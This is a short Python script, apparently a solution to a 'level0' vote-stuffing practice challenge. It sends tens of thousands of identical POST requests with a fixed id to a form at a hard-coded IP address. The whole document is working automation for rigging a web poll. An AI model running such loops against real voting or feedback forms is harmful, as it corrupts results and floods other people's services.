import requests
r = requests.get('http://158.69.76.135/level0.php')
payload = {'id': '217', 'holdthedoor': 'Submit'}
for i in range(43415):
    r = requests.post('http://158.69.76.135/level0.php', data=payload)
    if i % 500 == 0:
        print i
print('done')
